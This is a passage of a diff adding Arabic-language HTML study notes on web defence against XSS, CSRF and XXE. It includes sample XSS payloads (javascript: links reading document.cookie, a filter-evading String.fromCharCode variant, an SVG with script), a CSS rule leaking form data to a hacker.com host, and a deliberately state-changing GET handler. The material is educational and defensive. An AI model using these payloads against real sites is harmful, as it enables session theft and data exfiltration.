+        <p>السماح لبيانات المستخدم بملء <span class="term">DOM</span> يجب أن يكون خيارًا أخيرًا — ليس الأول. في كل مرة يوجد فيها بديل لا يتطلب حقن <span class="term">DOM</span>، اختره بدلًا من ذلك.</p>
+    </div>
+</div>
+
+<!-- ════════ تنقية مدخلات المستخدم ════════ -->
+<div id="xss-sanitize" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128703;</div>
+        <h2>تنقية مدخلات المستخدم</h2>
+    </div>
+
+    <p>في بعض الأحيان لا يمكنك تجنب حقن بيانات المستخدم كـ <span class="term">HTML</span> — على سبيل المثال، عندما تتطلب الميزة السماح بوسوم معينة (مثل <code>&lt;b&gt;</code> أو <code>&lt;i&gt;</code>) دون غيرها (مثل <code>&lt;script&gt;</code>). في هذه الحالات، التنقية <strong>المكثفة</strong> مطلوبة قبل أن تصل أي بيانات إلى <span class="term">DOM</span>.</p>
+
+    <div class="story">
+        <div class="story-label">&#128214; من الكتاب — تجاوز المرشحات البسيطة</div>
+        <p>افترض أن المُنقّي يحجب علامات الاقتباس المفردة والمزدوجة ووسوم <code>&lt;script&gt;</code>. لا يزال بإمكان المهاجم تنفيذ الرمز البرمجي باستخدام مخطط <span class="term">JavaScript</span> الزائف:</p>
+    </div>
+
+    <div class="code-box">
+<span class="c">&lt;!-- No script tags, no quotes — but still executes JavaScript --&gt;</span>
+<span class="tag">&lt;a</span> <span class="attr">href</span>=<span class="s">"javascript:alert(document.cookie)"</span><span class="tag">&gt;</span>click me<span class="tag">&lt;/a&gt;</span>
+
+<span class="c">&lt;!-- Even bypasses quote filtering using String.fromCharCode() --&gt;</span>
+<span class="tag">&lt;a</span> <span class="attr">href</span>=<span class="s">"javascript:alert(String.fromCharCode(88,83,83))"</span><span class="tag">&gt;</span>click me<span class="tag">&lt;/a&gt;</span>
+<span class="c">&lt;!-- Alerts "XSS" without any quotes in the payload --&gt;</span>
+    </div>
+
+    <div class="warning">
+        <h4>&#9888;&#65039; التنقية صعبة للغاية</h4>
+        <p>مواصفات <span class="term">DOM</span> واسعة ومعقدة. أي واجهة برمجية تحوّل النص إلى <span class="term">DOM</span> أو نص إلى نص برمجي هي ناقل محتمل لـ <span class="term">XSS</span>. يكاد يكون من المستحيل تحقيق التنقية الكاملة بحل محلي الصنع — يُفضَّل دائمًا المكتبات المُختبَرة والمُصانة والحمايات الأصلية للمتصفح.</p>
+    </div>
+
+    <h3>تنقية الروابط التشعبية</h3>
+    <p>عند استخدام مدخلات المستخدم في عناوين <span class="term">URL</span> للتنقل، استفد من تنقية المتصفح المدمجة في وسم <code>&lt;a&gt;</code> بدلًا من بناء مرشحك الخاص:</p>
+
+    <div class="code-box">
+<span class="c">// ✓ Use a dummy &lt;a&gt; tag to take advantage of browser sanitization</span>
+<span class="k">const</span> userLink = <span class="s">"&lt;script&gt;alert('hi')&lt;/script&gt;"</span>;
+
+<span class="k">const</span> <span class="n">goToLink</span> = <span class="k">function</span>() {
+    <span class="k">const</span> dummy = document.createElement(<span class="s">'a'</span>);
+    dummy.href = userLink;
+    window.location.href = <span class="s">`https://mywebsite.com/${dummy.href}`</span>;
+    <span class="c">// Browser encodes tags: %3Cscript%3Ealert(...)%3C%2Fscript%3E</span>
+};
+    </div>
+
+    <p>يمكنك أيضًا استخدام <span class="term">encodeURIComponent()</span> لترميز أجزاء <span class="term">URI</span> الفردية. وإن كان نظريًا يمكن الالتفاف عليه، فإن هذه الدوال الأصلية للمتصفح أُختبرت بشكل أفضل بكثير من أي حل مخصص.</p>
+</div>
+
+<!-- ════════ مصارف DOM API الخطيرة ════════ -->
+<div id="xss-sinks" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#9888;&#65039;</div>
+        <h2>مصارف <span class="term">DOM API</span> الخطيرة</h2>
+    </div>
+
+    <p><strong>المصرف</strong> هو أي واجهة برمجية تحوّل النص إلى <span class="term">DOM</span> أو نص برمجي قابل للتنفيذ. الواجهات التالية هي أكثر مصارف <span class="term">XSS</span> شيوعًا — تجنبها كلما أمكن، ونقِّ بصرامة عند الضرورة:</p>
+
+    <table class="data-table">
+        <thead>
+            <tr>
+                <th>الواجهة</th>
+                <th>الخطر</th>
+                <th>البديل الأكثر أمانًا</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><strong><span class="term">element.innerHTML / outerHTML</span></strong></td>
+                <td>يُفسّر وسوم <span class="term">HTML</span> كـ <span class="term">DOM</span> — مصرف <span class="term">XSS</span> مباشر</td>
+                <td>استخدم <span class="term">innerText</span> أو <span class="term">document.createElement()</span></td>
+            </tr>
+            <tr>
+                <td><strong><span class="term">DOMParser.parseFromString()</span></strong></td>
+                <td>يحوّل سلسلة إلى شجرة <span class="term">DOM</span> كاملة — وسوم <span class="term">script</span> تُنفَّذ</td>
+                <td>أنشئ عقد <span class="term">DOM</span> يدويًا باستخدام <span class="term">createElement()</span> + <span class="term">appendChild()</span></td>
+            </tr>
+            <tr>
+                <td><strong><span class="term">SVG</span></strong></td>
+                <td>صيغة <span class="term">XML</span> تدعم وسوم <code>&lt;script&gt;</code> ومعالجات <span class="term">onload</span></td>
+                <td>نقِّ أو ارفض ملفات <span class="term">SVG</span> التي يرفعها المستخدمون؛ افضل الصيغ النقطية (<span class="term">PNG</span> و<span class="term">JPG</span>)</td>
+            </tr>
+            <tr>
+                <td><strong><span class="term">Blob + createObjectURL()</span></strong></td>
+                <td>يمكنه تخزين بيانات تعسفية بما فيها نصوص قابلة للتنفيذ، ثم حقنها عبر <span class="term">script.src</span></td>
+                <td>تجنب <span class="term">Blob</span> عند تضمين أي جزء من بيانات المستخدم في عملية الإنشاء</td>
+            </tr>
+            <tr>
+                <td><strong><span class="term">document.write() / writeln()</span></strong></td>
+                <td>يكتب <span class="term">HTML</span> خامًا مباشرة في تدفق المستند</td>
+                <td>لا تستخدمه في التطبيقات الحديثة؛ أنشئ <span class="term">DOM</span> بواجهات <span class="term">API</span> قياسية</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <div class="story">
+        <div class="story-label">&#128214; من الكتاب — تنفيذ نص SVG البرمجي</div>
+        <p>ملفات <span class="term">SVG</span> مبنية على <span class="term">XML</span>، مما يعني دعمها لوسوم <code>&lt;script&gt;</code> المدمجة. يمكن لملف <span class="term">SVG</span> مرفوع أن ينفّذ <span class="term">JavaScript</span> تعسفيًا عند تحميله في الصفحة — مما يجعل <span class="term">SVG</span> أكثر خطورة بكثير من صيغ الصور النقطية:</p>
+    </div>
+
+    <div class="code-box">
+<span class="tag">&lt;svg</span> <span class="attr">version</span>=<span class="s">"1.1"</span> <span class="attr">xmlns</span>=<span class="s">"http://www.w3.org/2000/svg"</span><span class="tag">&gt;</span>
+    <span class="tag">&lt;circle</span> <span class="attr">cx</span>=<span class="s">"250"</span> <span class="attr">cy</span>=<span class="s">"250"</span> <span class="attr">r</span>=<span class="s">"50"</span> <span class="attr">fill</span>=<span class="s">"red"</span> <span class="tag">/&gt;</span>
+    <span class="tag">&lt;script</span> <span class="attr">type</span>=<span class="s">"text/javascript"</span><span class="tag">&gt;</span>console.log(<span class="s">'test'</span>);<span class="tag">&lt;/script&gt;</span>
+<span class="tag">&lt;/svg&gt;</span>
+    </div>
+
+    <div class="key-point">
+        <h4>&#128273; القاعدة الإرشادية</h4>
+        <p>أي واجهة برمجية تحوّل النص إلى <span class="term">DOM</span> أو نص إلى نص برمجي هي ناقل محتمل لهجوم <span class="term">XSS</span>. افضل الواجهات التي تمنحك تحكمًا صريحًا في إنشاء العناصر (<span class="term">createElement</span>، <span class="term">appendChild</span>) على الواجهات التي تُفسّر السلاسل كعلامات.</p>
+    </div>
+</div>
+
+<!-- ════════ ترميز كيانات HTML ════════ -->
+<div id="xss-entity" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128290;</div>
+        <h2>ترميز كيانات <span class="term">HTML</span></h2>
+    </div>
+
+    <p>يُحوّل ترميز الكيانات الأحرف التي يُحتمل أن تكون خطيرة إلى ما يعادلها من كيانات <span class="term">HTML</span>. تُعرض الأحرف المُرمَّزة <strong>بشكل صحيح</strong> في المتصفح لكن <strong>لا يمكن تفسيرها كرمز برمجي</strong>.</p>
+
+    <h3>الأحرف «الخمسة الكبار»</h3>
+
+    <table class="data-table">
+        <thead>
+            <tr>
+                <th>الحرف</th>
+                <th>الكيان المُرمَّز</th>
+                <th>أهميته</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><strong>&amp;</strong></td>
+                <td><code>&amp;amp;</code></td>
+                <td>يبدأ تسلسلات الكيانات — يجب الهروب منه لمنع حقن كيانات أخرى</td>
+            </tr>
+            <tr>
+                <td><strong>&lt;</strong></td>
+                <td><code>&amp;lt;</code></td>
+                <td>يفتح وسوم <span class="term">HTML</span> — الحرف الأساسي المستخدم لبدء <code>&lt;script&gt;</code> والعناصر الخطيرة الأخرى</td>
+            </tr>
+            <tr>
+                <td><strong>&gt;</strong></td>
+                <td><code>&amp;gt;</code></td>
+                <td>يغلق وسوم <span class="term">HTML</span></td>
+            </tr>
+            <tr>
+                <td><strong>"</strong></td>
+                <td><code>&amp;#034;</code></td>
+                <td>يخرج من قيم السمات في سياقات الاقتباس المزدوج</td>
+            </tr>
+            <tr>
+                <td><strong>'</strong></td>
+                <td><code>&amp;#039;</code></td>
+                <td>يخرج من قيم السمات في سياقات الاقتباس المفرد</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <div class="warning">
+        <h4>&#9888;&#65039; ترميز الكيانات له حدود</h4>
+        <p>يحمي ترميز الكيانات <strong>فقط المحتوى المُحقَن في عناصر جسم <span class="term">HTML</span></strong> (مثل <code>&lt;div&gt;</code> أو <code>&lt;p&gt;</code>). لا يحمي المحتوى المُحقَن داخل وسوم <code>&lt;script&gt;</code> أو <span class="term">CSS</span> أو عناوين <span class="term">URL</span> — لأنه يمكن بناء <span class="term">JavaScript</span> صالح من تسلسلات الأحرف المُرمَّزة بالكيانات في تلك السياقات.</p>
+    </div>
+</div>
+
+<!-- ════════ CSS كناقل هجوم ════════ -->
+<div id="xss-css" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#127912;</div>
+        <h2><span class="term">CSS</span> كناقل هجوم</h2>
+    </div>
+
+    <p>يُعتبر <span class="term">CSS</span> عادةً تقنية «عرض فحسب»، لكن مواصفاته قوية بما يكفي لاستخدامه كقناة لتسريب البيانات. إذا سمح تطبيقك للمستخدمين بتحميل أوراق أنماط مخصصة، يمكن للمهاجمين استخدام <span class="term">CSS</span> <strong>لتسريب بيانات النماذج إلى خوادم خارجية</strong>.</p>
+
+    <div class="story">
+        <div class="story-label">&#128214; من الكتاب — تسريب البيانات عبر CSS</div>
+        <p>يتيح <span class="term">CSS</span> التنسيق الانتقائي بناءً على قيم حقول النماذج. مقترنًا بـ <span class="term">background:url()</span>، يمكن للمهاجم تشغيل طلبات <span class="term">HTTP GET</span> تُسرّب بيانات النماذج إلى خادم بعيد — دون أي <span class="term">JavaScript</span> على الإطلاق:</p>
+    </div>
+
+    <div class="code-box">
+<span class="c">/* When the income field is set to ">100k", CSS triggers a GET request */</span>
+<span class="tag">#income</span>[<span class="attr">value</span>=<span class="s">">100k"</span>] {
+    <span class="k">background</span>: <span class="n">url</span>(<span class="s">"https://www.hacker.com/incomes?amount=gte100k"</span>);
+}
+<span class="c">/* The form value is leaked to the attacker's server via the URL */</span>
+    </div>
+
+    <h3>ثلاثة مستويات للدفاع ضد <span class="term">CSS</span></h3>
+
+    <table class="data-table">
+        <thead>
+            <tr>
+                <th>الصعوبة</th>
+                <th>الدفاع</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><strong>سهل</strong></td>
+                <td>عدم السماح بأوراق أنماط <span class="term">CSS</span> التي يرفعها المستخدمون — الحل الأبسط والأكثر فعالية</td>
+            </tr>
+            <tr>
+                <td><strong>متوسط</strong></td>
+                <td>السماح للمستخدمين بتعديل حقول محددة وآمنة فحسب — ثم إنشاء ورقة الأنماط بنفسك على الخادم باستخدام تلك الحقول</td>
+            </tr>
+            <tr>
+                <td><strong>صعب</strong></td>
+                <td>تنقية أي سمات <span class="term">CSS</span> تُطلق <span class="term">HTTP</span> (مثل <span class="term">background:url</span>، و<span class="term">@import</span>، إلخ) — صعب للغاية تحقيقه بشكل شامل</td>
+            </tr>
+        </tbody>
+    </table>
+</div>
+
+<!-- ════════ سياسة أمان المحتوى ════════ -->
+<div id="xss-csp" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128737;</div>
+        <h2>سياسة أمان المحتوى (<span class="term">CSP</span>)</h2>
+    </div>
+
+    <p>سياسة أمان المحتوى هي <strong>ضبط أمان على مستوى المتصفح</strong> يُقيّد الرمز البرمجي الذي يمكن تنفيذه داخل تطبيقك. تدعم <span class="term">CSP</span> جميع المتصفحات الرئيسية وتوفر طبقة دفاع أولى قوية ضد <span class="term">XSS</span>.</p>
+
+    <h3>مصدر النصوص البرمجية (<span class="term">script-src</span>)</h3>
+    <p>تتيح لك <span class="term">CSP</span> إدراج عناوين <span class="term">URL</span> محددة مسموح بتحميل النصوص البرمجية منها في القائمة البيضاء. أي نص برمجي من مصدر غير مُدرج يُحجب ويُلقي المتصفح خطأ انتهاك <span class="term">CSP</span>.</p>
+
+    <div class="code-box">
+<span class="c">/* CSP header — only allow scripts from your own domain and your API */</span>
+Content-Security-Policy: <span class="k">script-src</span> <span class="s">"self"</span> <span class="s">https://api.mega-bank.com</span>
+
+<span class="c">/* Attempting to load a script from https://www.hacker.com → BLOCKED */</span>
+<span class="c">/* Attempting to load a script from https://api2.mega-bank.com → BLOCKED */</span>
+    </div>
+
+    <div class="warning">
+        <h4>&#9888;&#65039; تجنب القوائم البيضاء ذات أحرف البدل في <span class="term">CSP</span></h4>
+        <p>إدراج <code>https://*.mega-bank.com</code> قد يبدو مريحًا، لكن إذا سمح أي نطاق فرعي لاحقًا بتحميل محتوى من المستخدمين (مثل <code>hosting.mega-bank.com</code>)، يمكن للمهاجم استضافة نصوص برمجية خبيثة على ذلك النطاق الفرعي وتجاوز <span class="term">CSP</span> بالكامل. أدرج دائمًا مصادر محددة.</p>
+    </div>
+
+    <h3><span class="term">Unsafe Eval</span> و <span class="term">Unsafe Inline</span></h3>
+    <p>عند تفعيل <span class="term">CSP</span>، يتم <strong>تعطيل</strong> قدرتين خطيرتين بشكل افتراضي:</p>
+
+    <div class="compare-grid">
+        <div class="compare-card" style="border-top-color: var(--red);">
+            <h4><span class="term">unsafe-inline</span></h4>
+            <p>يسمح بوسوم <code>&lt;script&gt;</code> المضمنة ومعالجات الأحداث المضمنة. معطّل بشكل افتراضي عند تفعيل <span class="term">CSP</span>. إعادة تفعيله يُضعف حماية <span class="term">XSS</span> بشكل كبير.</p>
+        </div>
+        <div class="compare-card" style="border-top-color: var(--red);">
+            <h4><span class="term">unsafe-eval</span></h4>
+            <p>يسمح بـ <span class="term">eval()</span> ودوال تحويل النص إلى رمز مشابهة. معطّل بشكل افتراضي عند تفعيل <span class="term">CSP</span>. إذا كان كودك يستخدم <span class="term">eval</span>، أعد كتابته لتجنب تفسير السلاسل.</p>
+        </div>
+    </div>
+
+    <div class="story">
+        <div class="story-label">&#128214; من الكتاب — إعادة كتابة كود يشبه eval</div>
+        <p>الكود الذي يمرر سلاسل إلى دوال مثل <span class="term">setTimeout</span> يمكن في الغالب إعادة كتابته لتجنب تفسير السلاسل بالكلية:</p>
+    </div>
+
+    <div class="code-box">
+<span class="c">// ✗ UNSAFE — string is interpreted as code (requires unsafe-eval)</span>
+<span class="k">const</span> <span class="n">startTimer</span> = <span class="k">function</span>(minutes, message) {
+    setTimeout(<span class="s">`window.alert(${message});`</span>, minutes * <span class="n">60</span> * <span class="n">1000</span>);
+};
+
+<span class="c">// ✓ SAFE — function reference, no string interpretation needed</span>
+<span class="k">const</span> <span class="n">startTimer</span> = <span class="k">function</span>(minutes, message) {
+    setTimeout(<span class="k">function</span>() {
+        alert(message);
+    }, minutes * <span class="n">60</span> * <span class="n">1000</span>);
+};
+    </div>
+
+    <h3>كيفية تنفيذ <span class="term">CSP</span></h3>
+
+    <ol class="step-list">
+        <li>
+            <div class="step-num">1</div>
+            <div>
+                <strong>ترويسة <span class="term">HTTP</span> (مُوصى بها)</strong><br>
+                أرسل ترويسة <span class="term">Content-Security-Policy</span> مع كل استجابة من الخادم. قيمة الترويسة هي نص السياسة نفسه.
+            </div>
+        </li>
+        <li>
+            <div class="step-num">2</div>
+            <div>
+                <strong>وسم <span class="term">HTML Meta</span> (بديل)</strong><br>
+                ضمِّن وسم <code>&lt;meta http-equiv="Content-Security-Policy" content="..."&gt;</code> في <code>&lt;head&gt;</code> الخاص بـ <span class="term">HTML</span>. أقل مرونة من نهج الترويسة لكن مفيد عندما لا تستطيع التحكم في ترويسات الخادم.
+            </div>
+        </li>
+    </ol>
+
+    <div class="key-point">
+        <h4>&#128273; <span class="term">CSP</span> لا تحمي من <span class="term">DOM XSS</span></h4>
+        <p><span class="term">CSP</span> إجراء أول قوي ضد <span class="term">XSS</span> المنعكس والمُخزَّن، لكنها <strong>لا</strong> تحمي من <span class="term">XSS</span> القائم على <span class="term">DOM</span> — حيث توجد الثغرة كليًا في <span class="term">JavaScript</span> من جانب العميل. يجمع الدفاع الشامل بين <span class="term">CSP</span> وأفضل ممارسات البرمجة الموضحة سابقًا في هذا الفصل.</p>
+    </div>
+</div>
+
+<div class="section-divider"></div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!--               الفصل 23 — الدفاع ضد CSRF                  -->
+<!-- ══════════════════════════════════════════════════════════ -->
+
+<!-- ════════ التحقق من الترويسات ════════ -->
+<div id="csrf-headers" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128274;</div>
+        <h2>ف.23 — التحقق من الترويسات</h2>
+    </div>
+
+    <p>تنشأ كثير من هجمات <span class="term">CSRF</span> من موقع مختلف عن الموقع المستهدف. لهذا السبب، يمكننا استخدام ترويسات <span class="term">HTTP</span> للتحقق من <strong>مصدر كل طلب</strong> كخط دفاع أول.</p>
+
+    <h3>ترويستان للفحص</h3>
+
+    <div class="compare-grid">
+        <div class="compare-card" style="border-top-color: var(--ch);">
+            <h4>ترويسة <span class="term">Origin</span></h4>
+            <p>تُرسَل في طلبات <span class="term">HTTP POST</span>. تشير إلى مكان نشأة الطلب. موجودة في <span class="term">HTTP</span> و<span class="term">HTTPS</span>. لا يمكن تعديلها برمجيًا بواسطة <span class="term">JavaScript</span> في المتصفحات الرئيسية.</p>
+        </div>
+        <div class="compare-card" style="border-top-color: var(--ch);">
+            <h4>ترويسة <span class="term">Referer</span></h4>
+            <p>تُرسَل في جميع الطلبات (ما لم يُعيَّن <span class="term">rel=noreferer</span>). تشير أيضًا إلى مصدر الطلب. يجب فحصها جانبًا مع ترويسة <span class="term">Origin</span> للدفاع المتعمق.</p>
+        </div>
+    </div>
+
+    <div class="code-box">
+<span class="k">const</span> validLocations = [
+    <span class="s">'https://www.mega-bank.com'</span>,
+    <span class="s">'https://api.mega-bank.com'</span>,
+    <span class="s">'https://portal.mega-bank.com'</span>
+];
+
+<span class="k">const</span> <span class="n">validateHeadersAgainstCSRF</span> = <span class="k">function</span>(headers) {
+    <span class="k">const</span> origin  = headers.origin;
+    <span class="k">const</span> referer = headers.referer;
+
+    <span class="k">if</span> (!origin || !referer) { <span class="k">return</span> <span class="n">false</span>; }
+
+    <span class="k">if</span> (!validLocations.includes(origin) ||
+        !validLocations.includes(referer)) {
+        <span class="k">return</span> <span class="n">false</span>;
+    }
+    <span class="k">return</span> <span class="n">true</span>;
+};
+    </div>
+
+    <div class="info-box">
+        <h4>&#128161; التحقق من الترويسات نقطة بداية</h4>
+        <p>إذا حقق مهاجم <span class="term">XSS</span> على أحد مصادرك المدرجة في القائمة البيضاء، يمكنه بدء هجمات <span class="term">CSRF</span> التي تبدو قادمة من خوادمك الخاصة — متجاوزًا التحقق من الترويسات بالكامل. لهذا يجب دائمًا دمج التحقق من الترويسات مع رموز <span class="term">CSRF</span> ودفاعات أخرى.</p>
+    </div>
+</div>
+
+<!-- ════════ رموز CSRF ════════ -->
+<div id="csrf-tokens" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128273;</div>
+        <h2>رموز <span class="term">CSRF</span> — الدفاع الأساسي</h2>
+    </div>
+
+    <p>أقوى الدفاعات الأكثر استخدامًا ضد <span class="term">CSRF</span> هو <strong>رمز مكافحة <span class="term">CSRF</span></strong>. تعتمد معظم المواقع الكبرى على رموز <span class="term">CSRF</span> كدفاعها الأساسي ضد <span class="term">CSRF</span>.</p>
+
+    <h3>كيف تعمل رموز <span class="term">CSRF</span></h3>
+
+    <ol class="step-list">
+        <li>
+            <div class="step-num">1</div>
+            <div>
+                <strong>الخادم يولّد رمزًا فريدًا</strong><br>
+                يُولَّد الرمز بشكل مشفر باحتمالية تصادم منخفضة جدًا. يُولَّد عادةً مرة واحدة في كل جلسة (وإن كان يمكن إعادة توليده لكل طلب لأمان أعلى).
+            </div>
+        </li>
+        <li>
+            <div class="step-num">2</div>
+            <div>
+                <strong>العميل يُرسل الرمز مع كل طلب</strong><br>
+                يُضمَّن الرمز في كل من إرسالات النماذج وطلبات <span class="term">AJAX</span>. على جانب الخادم، يُتحقق من الرمز للتأكد من أنه حي (غير منتهي الصلاحية)، وأصيل، وغير مُعدَّل. إذا فشل التحقق، يُسجَّل الطلب ويُرفض.
+            </div>
+        </li>
+        <li>
+            <div class="step-num">3</div>
+            <div>
+                <strong>المهاجمون لا يستطيعون تزوير الرمز</strong><br>
+                بما أن كل رمز فريد لكل جلسة ومستخدم، لا يستطيع مهاجم على مصدر مختلف الحصول على رمز صالح. سيحتاج إلى استهداف مستخدم محدد والحصول على رمزه الحالي غير منتهي الصلاحية — وهو هجوم أصعب بكثير.
+            </div>
+        </li>
+    </ol>
+
+    <h3>رموز <span class="term">CSRF</span> عديمة الحالة</h3>
+    <p>تستخدم تطبيقات الويب الحديثة في الغالب واجهات برمجية عديمة الحالة (<span class="term">REST</span>). يمكن تنفيذ رموز <span class="term">CSRF</span> دون تخزين جلسة من جانب الخادم بدمج ثلاثة مكونات:</p>
+
+    <ul class="clean-list">
+        <li><strong>معرّف المستخدم</strong> — يربط الرمز بصاحبه بشكل فريد</li>
+        <li><strong>طابع زمني</strong> — يُمكّن انتهاء صلاحية الرمز (مثلًا أسبوع واحد)</li>
+        <li><strong>نونس مشفر</strong> — موقَّع بمفتاح سري من جانب الخادم لمنع التزوير</li>
+    </ul>
+
+    <div class="indigo-box">
+        <h4>&#128274; الرموز عديمة الحالة قابلة للتوسع بشكل أفضل</h4>
+        <p>تستهلك رموز <span class="term">CSRF</span> عديمة الحالة موارد خادم أقل من الرموز المُدارة بالجلسات لأنها لا تتطلب من الخادم تتبع الجلسات النشطة. يتحقق الخادم من الرمز باستخدام مفتاحه السري عند وقت الطلب — دون الحاجة إلى الاستعلام عن قاعدة البيانات.</p>
+    </div>
+</div>
+
+<!-- ════════ طلبات GET عديمة الحالة ════════ -->
+<div id="csrf-get" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128683;</div>
+        <h2>طلبات <span class="term">GET</span> عديمة الحالة — القاعدة الأساسية</h2>
+    </div>
+
+    <p>الناقل الأكثر شيوعًا والأسهل استغلالًا لهجوم <span class="term">CSRF</span> هو طلب <span class="term">HTTP GET</span> الذي يُعدّل حالة الخادم. الإصلاح قاعدة تصميم مطلقة: <strong>يجب ألا تخزّن طلبات <span class="term">HTTP GET</span> أو تُعدّل أي حالة من جانب الخادم.</strong></p>
+
+    <div class="compare-grid">
+        <div class="compare-card" style="border-top-color: var(--red);">
+            <h4>&#10060; ثغرة: <span class="term">GET</span> يُعدّل الحالة</h4>
+            <p>نقطة نهاية <span class="term">GET</span> واحدة تسترجع وتحدث اختياريًا مستخدمًا. يمكن للمهاجم صياغة رابط مثل <code>GET /user?id=123&amp;updates=email:hacker</code> لتعديل بريد المستخدم الإلكتروني بنقرة رابط بسيطة.</p>
+        </div>
+        <div class="compare-card" style="border-top-color: var(--green);">
+            <h4>&#9989; آمن: <span class="term">GET</span> و<span class="term">POST</span> منفصلان</h4>
+            <p>نقسم إلى نقطة نهاية <span class="term">GET</span> (قراءة فحسب) ونقطة نهاية <span class="term">POST</span> (كتابة). لا يمكن لـ <span class="term">GET</span> تعديل الحالة أبدًا، و<span class="term">POST</span> ليس عرضة لهجمات <span class="term">CSRF</span> القائمة على الروابط أو الصور.</p>
+        </div>
+    </div>
+
+    <div class="code-box">
+<span class="c">// ✗ VULNERABLE — GET request modifies state</span>
+<span class="k">const</span> <span class="n">user</span> = <span class="k">function</span>(req, res) {
+    getUserById(req.query.id).then(<span class="k">function</span>(user) {
+        <span class="k">if</span> (req.query.updates) { user.update(req.updates); } <span class="c">// state change in GET!</span>
+        <span class="k">return</span> res.json(user);
+    });
+};
+
+<span class="c">// ✓ SAFE — read and write are separate endpoints</span>
+<span class="k">const</span> <span class="n">getUser</span> = <span class="k">function</span>(req, res) {        <span class="c">// GET — read only</span>
+    getUserById(req.query.id).then(<span class="k">function</span>(user) {
+        <span class="k">return</span> res.json(user);
+    });
+};
+
+<span class="k">const</span> <span class="n">updateUser</span> = <span class="k">function</span>(req, res) {    <span class="c">// POST — writes</span>
+    getUserById(req.query.id).then(<span class="k">function</span>(user) {
+        user.update(req.updates).then(<span class="k">function</span>(updated) {
+            <span class="k">if</span> (!updated) { <span class="k">return</span> res.sendStatus(<span class="n">400</span>); }
+            <span class="k">return</span> res.sendStatus(<span class="n">200</span>);
+        });
+    });
+};
+    </div>
+
+    <div class="key-point">
+        <h4>&#128273; طبيعة الويب تجعل <span class="term">GET</span> خطيرًا</h4>
+        <p>الروابط والصور وأوراق الأنماط والإطارات كلها تُطلق طلبات <span class="term">HTTP GET</span> تلقائيًا. هذا يجعل <span class="term">GET</span> أكثر انكشافًا لـ <span class="term">CSRF</span> من <span class="term">POST</span>. بالتأكد من أن طلبات <span class="term">GET</span> دائمًا للقراءة فحسب، تُزيل فئة كاملة من هجمات <span class="term">CSRF</span> القائمة على الروابط والصور.</p>
+    </div>
+</div>
+
+<!-- ════════ برمجيات CSRF الوسيطة ════════ -->
+<div id="csrf-middleware" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128736;</div>
+        <h2>برمجيات مكافحة <span class="term">CSRF</span> الوسيطة على مستوى التطبيق</h2>
+    </div>
+
+    <p>دفاعات <span class="term">CSRF</span> فعّالة فحسب عند تطبيقها <strong>على مستوى التطبيق كله</strong>. نقطة نهاية واحدة غير محمية تكسر السلسلة بأكملها. تدعم حزم خوادم الويب الحديثة <strong>البرمجيات الوسيطة</strong> — رمز يعمل على كل طلب قبل تنفيذ أي منطق مسار.</p>
+
+    <div class="code-box">
+<span class="k">const</span> crypto   = require(<span class="s">'../util/crypto'</span>);
+<span class="k">const</span> dateTime = require(<span class="s">'../util/dateTime'</span>);
+<span class="k">const</span> session  = require(<span class="s">'../util/session'</span>);
+<span class="k">const</span> logger   = require(<span class="s">'../util/logger'</span>);
+
+<span class="k">const</span> <span class="n">validateCSRFToken</span> = <span class="k">function</span>(token, user) {
+    <span class="k">const</span> text_token = crypto.decrypt(token);
+    <span class="k">const</span> user_id = text_token.split(<span class="s">':'</span>)[<span class="n">0</span>];
+    <span class="k">const</span> date    = text_token.split(<span class="s">':'</span>)[<span class="n">1</span>];
+    <span class="k">const</span> nonce   = text_token.split(<span class="s">':'</span>)[<span class="n">2</span>];
+
+    <span class="k">let</span> validUser  = (user_id === user.id);
+    <span class="k">let</span> validDate  = dateTime.lessThan(<span class="n">1</span>, <span class="s">'week'</span>, date);
+    <span class="k">let</span> validNonce = crypto.validateNonce(user_id, date, nonce);
+
+    <span class="k">return</span> validUser &amp;&amp; validDate &amp;&amp; validNonce;
+};
+
+<span class="k">const</span> <span class="n">CSRFShield</span> = <span class="k">function</span>(req, res, next) {
+    <span class="k">if</span> (!validateHeaders(req.headers, req.method) ||
+        !validateCSRFToken(req.csrf, session.currentUser)) {
+        logger.log(req);            <span class="c">// log the failed attempt</span>
+        <span class="k">return</span> res.sendStatus(<span class="n">401</span>);  <span class="c">// reject before any logic runs</span>
+    }
+    <span class="k">return</span> next();                  <span class="c">// pass to route handler</span>
+};
+    </div>
+
+    <p>تجمع هذه البرمجية الوسيطة بين التحقق من الترويسات والتحقق من رمز <span class="term">CSRF</span> في فحص واحد يعمل قبل أي منطق مسار. ترفض الطلبات غير الصالحة بحالة 401 وتسجّل المحاولة للمراقبة.</p>
+
+    <div class="indigo-box">
+        <h4>&#128295; أتمتة على جانب العميل أيضًا</h4>
+        <p>بما أن البرمجية الوسيطة تتطلب رمز <span class="term">CSRF</span> في كل طلب، أتمتة إرفاق الرمز على جانب العميل أيضًا. يمكنك استخدام <strong>نمط الوكيل</strong> لتجاوز <span class="term">XMLHttpRequest</span> لتضمين الرمز دائمًا، أو بناء غلاف مكتبة طلبات يُحقن الرمز الصحيح بناءً على طريقة <span class="term">HTTP</span>.</p>
+    </div>
+</div>
+
+<div class="section-divider"></div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!--               الفصل 24 — الدفاع ضد XXE                   -->
+<!-- ══════════════════════════════════════════════════════════ -->
+
+<!-- ════════ تعطيل الكيانات الخارجية ════════ -->
+<div id="xxe-disable" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128196;</div>
+        <h2>ف.24 — تعطيل الكيانات الخارجية</h2>
+    </div>
+
+    <p>الدفاع الأساسي ضد <span class="term">XXE</span> بسيط بشكل لافت: <strong>عطّل معالجة الكيانات الخارجية في محلل <span class="term">XML</span> الخاص بك</strong>. هذا عادةً سطر واحد من الإعداد.</p>
+
